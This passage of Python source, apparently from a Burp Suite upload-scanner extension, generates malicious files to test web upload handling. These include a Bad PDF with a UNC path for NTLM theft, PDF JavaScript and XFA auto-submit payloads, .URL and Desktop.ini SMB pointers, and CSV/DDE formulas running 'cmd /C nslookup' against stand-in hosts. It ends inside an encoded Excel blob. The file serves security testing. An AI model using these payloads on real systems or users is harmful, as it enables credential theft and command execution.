            desc = 'A PDF file was uploaded and downloaded that has JavaScript content. The PDF pops JavaScript alerts.' \
                    'This only proofs that PDFs can be uploaded, that have active content. If a user executes the JavaScript code after downloading, ' \
                    'malicious code could potentially be executed. You should also try uploading a bad PDF, which will probably work as well. Bad PDF is described' \
                   'here: https://github.com/deepzec/Bad-Pdf and https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/ . Although they ' \
                   'claim that it works in any PDF reader, it did not work in IE\'s built-in PDF reader, but it did work in Adobe Reader.<br><br>' \
                   'The file that was uploaded here is from Ange Albertini and located at https://github.com/corkami/pocs/blob/master/pdf/javascript.pdf'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename, content, redownload=True)

            # Burp community edition doesn't have Burp collaborator
            if not burp_colab:
                return colab_tests

            # Bad PDF with Collaborator payload according to https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
            content = '''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (\\\\\\\\test.example.org\\\\test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
	/Root 1 0 R
>>
%%EOF
'''
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BadPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "Bad PDF interaction"
            base_detail = 'The payload was the bad PDF as described here: https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py . ' \
                          "Usually you will be able to steal NTLM credentials and similar request forgery scenarios. "
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Colaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                     "burp colaborator URL. This means that Server Side Request Forgery might be possible " \
                     "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                     "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.PDF_TYPES, basename + "Colab", content, issue_colab,
                               replace="test.example.org", redownload=True))

            content = '''% a pdf file where javascript code is evaluated for execution

% BSD Licence, Ange Albertini, 2011

%PDF-1.4
1 0 obj
<<>>
%endobj

trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("'''+Constants.MARKER_COLLAB_URL+'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>'''
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "JsOpenDocPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "PDF JavaScript openDoc interaction"
            base_detail = 'The payload was a PDF JavaScript with app.openDoc, similar to the one here: ' \
                          'https://github.com/corkami/pocs/blob/master/pdf/js-eval.pdf .'
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Colaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                           "burp colaborator URL. This means that Server Side Request Forgery might be possible " \
                           "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                           "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                       redownload=True))

            content = '''% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by InsertScript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>

<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="{}test"/>
            </event>

</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>'''.format(Constants.MARKER_COLLAB_URL)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "FormSubmitPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "PDF form submit interaction"
            base_detail = 'The payload was an auto submit PDF form, similar to the one here: ' \
                          'https://insert-script.blogspot.ch/2018/05/adobe-reader-pdf-client-side-request.html .'
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Collaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                           "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                           "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                           "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self.sender.simple(injector, Constants.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                       redownload=True))

        return colab_tests

    def _ssrf(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests

        # shortcut.url files for Windows
        content = '[InternetShortcut]\r\n' \
                  'URL=http://test.example.org/\r\n' \
                  'WorkingDirectory=\\\\test.example.org\SMBShare\r\n' \
                  'ShowCommand=7\r\n' \
                  'Modified=20F06BA06D07BD014D\r\n' \
                  'HotKey=1601'
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "UrlInternetShortcut"
        title_download = "Malicious URL file upload/download"
        title_colab = "URL file interaction"
        base_detail = 'The payload was a Windows .URL shortcut file, similar to the one here: ' \
                      'https://insert-script.blogspot.ch/2018/05/dll-hijacking-via-url-files.html .'
        detail_download = 'A .URL file was uploaded and downloaded that includes a payload. A user who downloades ' \
                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading an .URL file with a pointer to an external " \
                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
        self.sender.simple(injector, Constants.URL_TYPES, basename + "Mal", content, redownload=True)
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.URL_TYPES, basename + "Colab", content, issue_colab,
                                                   redownload=True, replace="test.example.org"))

        # The same with Desktop.ini
        content = '[.ShellClassInfo]\r\n' \
                  'IconResource=\\\\test.example.org\\\r\n'
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "DesktopIni"
        title_download = "Malicious Desktop.ini file upload/download"
        title_colab = "URL file interaction"
        base_detail = 'The payload was a Windows Desktop.ini file, similar to the one here: ' \
                      'https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ .'
        detail_download = 'A .ini file was uploaded and downloaded that includes a payload. A user who downloads ' \
                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading an .ini file with a pointer to an external " \
                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
        self.sender.simple(injector, Constants.INI_TYPES, "Desktop", content, redownload=True, randomize=False)
        colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.INI_TYPES, "Desktop", content, issue_colab,
                                                   redownload=True, replace="test.example.org", randomize=False))

        return colab_tests

    def _csv_spreadsheet(self, injector, burp_colab):
        colab_tests = []

        if injector.opts.file_formats['csv'].isSelected():
            title_download = "Malicious CSV upload/download"
            desc_download = 'A CSV with the content {} was uploaded and downloaded. When this spreadsheet is opened in {}, ' \
                            'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
                            'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
            title_colab = "Malicious CSV Collaborator Interaction"
            desc_colab = 'A CSV with the content {} was uploaded and lead to command execution. When this spreadsheet is opened in {}, ' \
                         'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
                         'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
            software_payload = (("Excel", "=cmd|' /C {} {}'!A0"), ("OpenOffice", '=DDE("cmd";"/C {} {}";"__DdeLink_60_870516294")'))
            for software_name, payload in software_payload:
                basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Csv" + software_name
                formula = payload.format("nslookup", "unknown.domain.example.org")
                issue = self._create_issue_template(injector.get_brr(), title_download, desc_download.format(formula, software_name), "Tentative", "Low")
                # Do simple upload/download based
                self.dl_matchers.add(DownloadMatcher(issue, filecontent=formula))
                self.sender.simple(injector, Constants.CSV_TYPES, basename + "Mal", formula, redownload=True)
                # TODO: Decide if additional sleep based payloads would make sense, probably rather not
                if burp_colab:
                    # Also do collaborator based:
                    for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
                        formula = payload.format(cmd, server)
                        desc = desc_colab + "<br>In this case we actually detected that interactions took place when using a {} command," \
                                "meaning the server executed the payload or someone opened it in the {} spreadsheet software. <br>" \
                                "The payload was {} . <br>" \
                                "Interactions: <br><br>".format(cmd_name, software_name, formula)
                        issue = self._create_issue_template(injector.get_brr(), title_colab, desc, "Firm", "High")
                        file_contents = []
                        file_contents.append(formula)
                        # Detect if original uploaded file was CSV, how many columns, etc., then start injecting CSV
                        # specific payloads such as the formulas above, but *only* if we detect an uploaded CSV
                        insertion_points = InsertionPointProviderForActiveScan(injector).get_csv_insertion_points(injector)
                        for insertion_point in insertion_points:
                            # Inject the formula into each field
                            _, _, content = insertion_point.create_request(formula)
                            file_contents.append(content)
                            # Injecting a collaborator URL with http:// and https:// etc. would be possible here
                            # but as we already pass this as an insertion point for active scan we don't do this here
                        for index, content in enumerate(file_contents):
                            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.CSV_TYPES, basename + "Colab" + str(index),
                                                                        content, issue, replace=replace, redownload=True))

        if injector.opts.file_formats['xlsx'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Excel"
            content_excel = 'eJztXQk8lNvfPzPGGFuWZC2mspWxr10hSUrIUilClkER7ljaiKJFi6JVud26bpcWktJKom5SlEjlqlvaQ2mn5TbvOc8YM/PMGLzL//O+/3d+Ps8zz/Ob' \
                             'c77f3znnd9Y5z6PhpsKjA8fV2wBO7IEY+MGUBGQuHQEepuwbeQC/ZzLRJfvTBB5MkfyfEkkKLEiyOFCcUi9RC4iATAGgDX6WkKrgGYDH8JgP4gAJgMR' \
                             '4OoP6r5LJmA3BBGTDReh4dvCKAPKgVgGoYZYpYufh2PkYFq4cO9vBbzCZEadi0+u3c4mTsHCbsfMY7DwMIMTTWJy/MI0p0AT34ScFbEWuTgRjJAhOIB' \
                             'hEg4UgBDDg+X9bCMkBQhCAAygnCg9hMUAI1BYMxEIZAIMIVAZMi8KAISYOGEJJSIjxIBJ+Z9UXQhYXggrc4DkCRIIEDI9GIMDQwtJFGjAEypuBQgBYA' \
                             'gOlS2rAEpDsl0WTRAXiQAO6/VSG0Zj51LG0sWNNbHtv5htit5okHdjSU3Fh/L3pYQH4gLpAAozmDWhkgseDGk2SAXQLXf6QAlCx4E6whOwBCKL2fjee' \
                             'FSWIasul6o3AqxxjOAZTTAqiapKMwDj4B2G44/NGxMWYAWhgKj8xNEogN58egjk4cOCsgAHqJYPwOHwAuJiPoPci+cSkcvW5FzG9OFv/UaT/79AjIQC' \
                             'ufCbiwp/s1ZP29qM/1o8+sx/9nn70v/ajP9yP/ugQ7dnZj/7IEPGHGv6/y57j/ejPYnpyP+H59WX96E/3oz/Rj/5CP3qWPRJs/XYFhUqtSi12eilc+l' \
                             '3Su6Q5+TCOpe/pxen1T0m+8Kz8lGLrb8MmHhxXZYeXBoL9XIbPTrZfGQjklR2oXPIUFJSllaU5/iwpEGcYH04Rppfrx055Tro8AUjrS5cCjx4os/WKH' \
                             'D1VoB6HP5wTfgG8VOe0DzSB9ovDvkiQXqkf/BF95RUezir309RkihJIpgAusQfWPbrtKRRDkMKjR0KEea8E51ysWRa7hxgGLSHyRyAMNQJxqBHEhhqB' \
                             'NNQI4kONQB5qBImhRqAMNYLkUCNIDTWC9FAjyAw1guxQIwwbagS5gSI44iKg1kCs/wgk7At6OHI59gCMH0RhcCDiQkEUBwdCFgoyfHAgEkJBlAYHQhE' \
                             'KMmJwIJJCQZQHA1LnJrx0VAYHIrx0VAcHIrx01AYHIrx01AcHIrx0NAYHIrx0Rg4GxMxceOmMGhyI8NLRHByI8NLRGhyI8NKhDg5EeOmMHhyI8NIZww' \
                             'MCBIOwOtP+QcYODkR46WgPDkR46egMDkR46egODkR46egNDoS3dLJxIPqYrQgEjZccHByYfCDoi/fv3zPZIBJcgdlLlxQBOkkuHZtOSoCO36hxPEZ9T' \
                             'QGDNyo1NZXPKG6dJJcObxS3jr9LHw8G6NLxqTDAZW2S4FQw63L/B1MxG2cUDaCq1m8qJATURgqXjm0Af/YY9mUP24gBRjxGgO2+KAKc2wnOnitdN5gc' \
                             '98WzGg9UKHhWEx7WPN9+WJkdecz+K41pX8n22y5iIMw6vpItLS3lK1lunSSXDl+y3Dr+rDAbalaY82YFIPeTFTXCCsCCh1UMx0rgZ7UE3K0WPgKRIsA' \
                             'B+UGsBgPCdBAOYj0YEPywAZ9+G6HpF5DrE3hyna9tY/sEM40gJNd/Gqis8RFshxphIuCuztDt8NUZXyfsAHedAHgGtjcdPHjwf6wj2UYcDudRcK5mZk' \
                             'LVoRpSHaOW02MSTHMoM0EOl60EkiZzGKwuJnCQpAMPQ3g4giiwHNBBDPZDCCohApxWSpDo4Q86upni6JqARWbqoNQgJgU+JjN+pjFCmcw4TOL08O9P7' \
                             'whmUuRjMudn0hXKZM5hItPDX79+LZhpOB+TBT/TeKFMFhwmCXo4832dYCYlPiZLfiYjoUyWHCYKPbyl7b1gphF8TFb8TGZCmaw4TJL08MddfwlmUkZM' \
                             'FgP4nhZkshiU79W5Vdx9I5hJhY9JgO+NFcrE7Xt1bj3XiwQzqfIxCfA9PaFM3L5X59ba2iqYSY2PSYDvGQhl4va9Ojfm81zBTOp8TAJ8z1goE7fv1bm' \
                             'dvPJCMJMGH5MA3zMXysTte3VuVx6dFMw0EjFZDeB7VMhkNSjfMzPfW/1cMNMoPiYBvqctlInb98zMP5ZkCGbS5GMS4Hv6Qpm4fc/MvLa2VjCTFh+TAN' \
                             '+jCWXi9j0zc2ZLuGAmKh+TAN8zEcrE7Xtm5lmH+qlPo/mYBPiehVAmbt8zMz/UkCWISQbO8OFst8/pHHEUo5gS/boZAP57m1mggLWPqg90LAfUjB90N' \
                             'A6U26MAeJ1iKhhUmwNqzg+qgwPldh7WyEUgqA4H1IIfdBwOlNtPINBFIBhUlwNqyQ9qiAPldgkApjAuCwbV44Ba8YOa4kC5Sx+AuCIXwaD6GGhifERw' \
                             'CD2HsowXlDgCA00E8SACTvFCIDQaJiJQcSZrBi/ee41GchgoGTouW0GAgbnvKDx3kjx324hyYBz6uWEynUEPjYxJjInIoaTi7FFmSoHJ0AoGPEJBJEx' \
                             'oIjwi+rUKDdB5rEIzW45VrDsKz50kz902OPQdn0Zm5lBovKaIk5nSYAo0YzlYCBZj21eowB/WxQDse5S1BihrnRfGCM5aJZi1zjBujMCsRcsKnKxN+q' \
                             '8mQhbQ0HKUMyOCHhKzMD6H4sNrjZgakwKtYUBb6NCWGGhXPEDTOL4WA9nArvksG9h3ZMgzAjZC8ognKvopgx4TRmdQZ9GXJuRQXHCpt2TKY3xRMN+eY' \
                             'sUZA8KwgqWCWfBzKfRgNIVh5wFKSK/PUoARmqS4JELYCbywBHWmGHCBPpHQ5/woMlqEYAOhlYpeIBIwThODJUvFlawYDDwDxMJSReXKLk0TVJoe9MQE' \
                             'RnA0X+0jjISl6QHtRtQMzBu4DUDrEWwD0KJFrwFSsDWF7Z1HbMLC5TmUMFwWScEoHtCMBFgYywFaHe2DY9Yx2b6AVhU4vsC6o/DcSfLcoWSbpYnDZGv' \
                             'jki0Ok+AJjY/ta0JYSZeFLSkM6BMaGQ3rJcx0J1zaNaDv+GDVMbq3WvJmP1qC6Es9IHOyH6QBaIc1Dg5gcAkwE5FLBEOLwvpcAdd5ycP2WBqA+yF0Rn' \
                             'xoJGNhOLTODufZcrCe3sfqFwP6NLIObTEL5/IvCehNU2YtwkAJ24iKsD2W5QGl8g/GxOSZsv3AUnv7SDw0kbuyiANEZIUn4h+LiSkIITITRsR0OFrX3' \
                             'ktkjSfiH4qJKQohMhdGxBptEjEiGzwRf58qNlwIkYXAUiGilmUCalnm0BlRMd/jwhPoVD96dDRsV2fjqo0qbFnmYNhR0IG+gzgMmQ6x/eA5GvNRdmJ4' \
                             'ugh2HUJrN2SsnvyURhJQT0iwnvjCRguZze59ABbeNk1CQEchAR2QNzxvRzEcTERjPd9gRgx3i4mrZURpONbzxapDzICtJZNTRUYAO5RvWGZRv8OCiWN' \
                             '8D6fH5FA24vBVYL5xcogKc45VQnHw+A7zEHFy91ACB1TcnT+Zp/Mn83T+ZJ7OnwyyKHPhwTFnK0A/hyvAxKGuERmEWoRl2JU7PMKgwyTC5tkMtlgLQR' \
                             'LWSnJCcO+KtQILsP3Sa2AuuKFlMWjHLNghw+ww3UNRBXu4M4HrM58iDw/AI5tgh2gKBynFBBIMQyAVE9BP9jIAhC4OE6MaO1FDg6NDx8IxzONUgJWHo' \
                             '8lYONlvx+7kgE9C2JTY0MTFcPzmEbyYrtK7n/sH80fvGlgVgQIP2EUlE2GWc8iZMBwFhFKU4cGxRrn3kwh2UqRkd3J9cySNCDxniJHQri+kHg1e/S1X' \
                             'iUhGElk/7vs7xcYkQDuCZi2Lo8cHGC1dHH00+7rHJRN55+5p39OfGbrmlU6i6LxaXZNV81vyxau52sq190oLZn/rdmucNbmQqhxNazHv3mf7hFGhJVF' \
                             '2aXdegeux95MNtDs0XAIOPrSe2VI0J3OVuurE4INyuz+eu1Cub70ubXrmHu+DK57HRbiV2mVtZWht/b3xqw3xumWSbto/acPqE73uq3ZkZts8qXW6+0' \
                             'zsVMmouXZvnn3Zrf1468lzDlYeR12dKOknLubc7iz8MrVWebLRtbN6n4x+N8g8UD+vetYXtZKXgXTLW5aFf1PfS29SvFQikxl0M4KqZvi80nZfZmfrn' \
                             'XnR5Q+ySrOSrQLrPKqYSgs+Obwc3lSX6p9KRO4rhsuvg3cKXlyEV1YE1oaWIAY9Ot7YCJ0zttxcdMlEZl3Xmor0WylejZdUdZKMD251Ms5PAW36qZFj' \
                             'NFo1Olpn1pClzlMyfu/qPmT3o3jjl7btL6jKew6TLz12crge2ZZkV5m6unbN7wU6FP+lcWvzV7SWBZV73sqfWG+qcXDaKZMdinLrW2aWexdPDrtVK9/' \
                             'o6txqEaKdWpD9c9Bdrd371B5ZuTV9Uva+a72geEthLfPEJZO6fTOrUo/RnjmTYqy3uy18GnKg0PiJT8XWQvrh25oNZWe+3PmHICihUct2KqfDqw2A9U' \
                             'N8QiR9Md2Y6+weHBMcQWcgD5Gpc5e6RJWf1JZyYMnWFuvQ8/rOIaXXi89/Bk556o41+xt/bb377Em69Y2HSs17Z8jOo+VJyG6g1xutP/02mVagUfjXt' \
                             'JF/0qLbakY8f7VUtfbk5uEPp1+N90oZ27x1TVHZA+qdMoPm0V20B4FntRfZbXTxfdnUPe6xc4eBrhTRRrDx1l81zVZLoB1trNrAZ7wpMrtzXv1GDRfl' \
                             'SuOnqZFfjTqO+Gul0/NnzuxUa51b6pRl6T09YF+7kdfsPcdN1i749XNpyVbZsyTG9dE0jWlU3V3fTcl7tb+5dB5pn7Nkx6zSCPKJsF1qVQ0BXyt8K5d' \
                             '3Na+YOds61mHjoSVrz1Jpr3qaNUY8vFS7vX5a6cueLXr53te7M6bUynjtfJRVeaW6MqVjW+X9KRJm1aafJ9krSBQ+cfE2krtGN10TrB1TouPx6PyEJ6' \
                             'Y5b6+pPFNzebHf+o9nfgcb9WvWa1/YtV/1tv3um7VK305bLVqnlKDnXbhq3LPQg0pdIREFs9fIR90quG/rdPLJJRnzJPuqm793eWlrJ996Z/D1pvHDc' \
                             '/OmSuTK71gRJns2+8f1p2arWha636xV0fvyu6M8eXNMcZBY4f0/ZfdeulKS3dEELH6pdvUx+uNGyd03stUyUWmNLuveOMZ7HvNb6pSasi7eepaW9DHH' \
                             'Qz8WSDiof6raoByY7p18Jl1udXiR1tylsq7vNo9KPtE4iuQOAyno1L4adk7Rqv2f+kXxV/NuOemVjyLnhxv6BO6nqr9/6e1TN29M959+m/aZ2RPTiN7' \
                             'a0x/XflK8eUvp8ekt+hPaLtuO2UghxmYq6i44431k0/jEnmP2q1Y2KjtKqKo1blAxUbB12rBF7488Gr2mUtovRez9508d1sapyz+8f2F9LLBi2Zdj0T' \
                             'FF13Jsp9RWb//25Hwl89te4/KHqd8/bzFmZntUbFbR/fHAgfn1za6ghwWac+bvfvza16H826t1p4OYr093VSZEdjESQqr1tK9Un99ys8KFtlb8p54nw' \
                             '1dOyJyesV5n1ZiG155227PFyyun3l7TEdyaMdMmTE3l7Y32Q38mjny3Qzsrt8v5uPjE8E2fVZeoP9q353rJ27AdtPvbPuzIXJHRkBv1xt6VJiHnO2Pa' \
                             'scsHS7WCNz532qCYqWxT1ejz8LjPplFHvuXJXy+uCbuWuyD+VYpHueYYj21uVzNHTFvTMDqzyjhKxTGujL73iV7gFq+7hyV66qZWn5p023Hl6kP0K7a' \
                             'ROl6d3hMcTS1lV2aEPR0zIfDDoUwNKcl9gQuulbfJSLflLLsYXLG2qctx7c/n/9ldHKpRqzMh8dXEyZtyrxJsX7voB54rCc2ZovvZ52ep0RvK17mde1' \
                             'RT9/fo9lHf03Iq3qycXPLsjZze6pqt891dndMKY+fcb7tuu3veO9vApgnVxbSmZ8d3BJzPs8nPP+0390BKhqnzi8i1x7t7fCTSNf39rIynPdxMPTIyx' \
                             'HfBA+eko4e7SdKdry6EWztrKgSv6VQ1vqdpX9NRdPnE1Ombeuzru6s6/qhf5/ks79BHwi/79lz8RlJ3WK9S4KVJaQgmdQcWyY0Nazb6ZHT/3bnnO5lG' \
                             'pTULguzLIucvCFotc+GkjHaSz/OKU7nURe6epDqSY3qb62lqyNlKea/E2RuL8hjxK5qUY9KuXG1fEpKTXPKlZdGKaqZH65N7DK2Ctp8NTnnf0fH/JWX' \
                             'cs7gjVS3rvmlFR5Ejd0y87Dk9Kf5Oom/8g+YeZndA/YWK5AfXOztsileoaS3f1BGoazvvi02F260LkyLyPWwbfTRTng/vsnufO9y1huH+LruhwJ648l' \
                             'bdVJPCpx8d9W5sAbsUJh42kxg+94y4i9+VJ24rp4ZZZDUoZq09fMG7VD63fc3bnW4XM7M1k9rnLD23YUsLze7V0TnNh8L95onn/LlUp66mbbvrHy+nn' \
                             'rCpuN4cdUo65dq50fvDjJ2qd9fpei3ZGhlD3pH9MddItd5x8rHO/JJI27knt3/dfCRpLii7b/B2W2u6VvsoB5lJpIxHJsP++pD73qe9ffOSMnOHPwq6' \
                             '1Zo2gMjj1gqeS88VnXkTsM8vQH2RytuTztUU670ZpzbFvJ1Ccsg48XJWvsqBn+cFnZbe5fdx+7iPyfJ+4pvDO1Joxe1RW1tvyFqYmou7l3/Ieli4Tt7' \
                             'M52RnT7yN6dqapZLHx94+ZjRFJa7NbMfEB299a2kzjJ6CTH3LMx4/LbRan3n5fr72m55FX85qRP4Wv/75nCLHyT1NOVFOfl9OZIsVtHpc+TBhn2vT6y' \
                             'vrSxO+SqnZ14+4EVvW01zlmlN08cGTyKQ3vzSMSM2gXq4On60WN5U0f+Qsn6gblPsZzzKPrq8sqt5+MODDeNcaz5+yXppNnudsum2Z1N1DEwvyHzI0V' \
                             'GNb9lTtXzu9dPLSUk/xOxaHZ7t/OJzNuOef6ED7nRahXf8bzHrn2e5LlE+E39u+ytA/sOiqxlEr3bV54XN6LBJjC+5/1r27+JPksh0g/cXn+FkPpJVI' \
                             '6X6muc7upn+7XxofEZGf9Poe7a3YbSNv7U1HH94rfFDqHzg2r6nq0Y7xDlcXuxjK1FunHDx18gLNOraspdZnmqbYS4bvLKnXrmdOPKeo/3b8zfTGkwT' \
                             '/p7l1p8gTlxl4/PTjg+s92a9lJUGHT1YHjyuU2OFt0HlnxgOTo77rgsvMXjYHTgrO9pov27Txq8L84IbEpIBjNUuKO5/UG9ZvHrfxultQ7S7Ln1PoQU' \
                             'UTijsrMs/ldtsRp79Ylm+16G5rxdRDAV1ZrlX7744v+7Y5cGHDS2uJfEeH6DIX4+Qut/T0mAoti7VF3vl/de1aPdX5VmzZjPr9czrI9TFRqglBYYtlj' \
                             'k5018o1vFi+524REwjqtWVvbf31FLzSILA2QXH32qxxFn7g0TvucpeqNlHK6F69hBIb23ROPlv3wfqGottiGU8tZa0ctL06X8sW0yhG64Iv5C48v+uX' \
                             '2uGhZn+bRh5Wp/z0asfPe6oWn+nMmuSt7JHZYhtWsmB1Vqz16xER2TP03XW1vfWNTHczhum5bstr2DDrS1qxTf6WOU/H5P/hePV8w7TuxJT97/YSkv/' \
                             'UrgiRX9EM1HZ67mGe+MdGPTPCWEs54IeXY3zLGnH9367UPRq797Ab6Zr/uXOXH/YlnUA0BP0PxHlFwLAcD4AfmXLEhMAzTsVHxI/0OKJGFD7uwyPhh1' \
                             '0cuSMIyVQQBt4JuCZZUoN2Cc8Z4tjD3uLwLwACrcMyZC+cue3Fzeo2Qd0m3GwO7WxnPUssz/MssTRRiSduiB0AlXZo2zkRm/wS4exTDrtWwPYwyMMkf' \
                             'T/0rtE9xNMhCNOPx/QG2Hk1pknjms3poJUvQCOsgt9UkRAX2uScjoXOwM66MHQ4Js8d9Liu9eG1v0VxbZjZK4dxXNcHsF2a6OlP9EfC5n/mmDQ5sD/l' \
                             'KvMouiAPlwfcMtGcfTUbWiEFUrCd+QBoq8mx9ngRh/XlCetMIcr3XtN6lXKwgEdhl3LYE7SoEmC33yXAPFakuzCIJaazJyqCU1gBTuIyYyMsko08ZhI' \
                             'hpBx7Xwp7jh5BUYEHdyACWoUQm8IqWJH82wpaLSFjazq8gjzj0Zpf33+ZGSl/JJsCDPROtKD9gvsBaz8v+n4SYO1NmwZY23PnAtYTE5GA9RxKGmA9Xr' \
                             'IJsJrn3YD1JNJTEmt3OIqDXiqA+ATdo/rgvjCUERsfG55AdV4aSo/GONNu6fpqezUSsGtyio0lvGZvtBKJSEQiEpGIRCQiEYlIRCISkYhEJPwibP5Pb' \
                             'K5vzjPSkN+2C87/aV+K0fz/KmA9RYu+R69kQS93QPN+tDqFdpahRUO0XQ/N3dE2GjTvTwaspc0MwFkPQOsDBwDvegCpl5s1l5fvW5Ht71NTnmUHsoe9' \
                             'CwXIyLNANXuNc2SE0BcmxIdEP01IoDP6HvkSiUhEIhKRiEQkIhGJSEQiEpGI5P+TYPN8APreM4PeGoZ2kaDf+NHv8WhujbaAoDk3mrOj+TvauYKm1mi' \
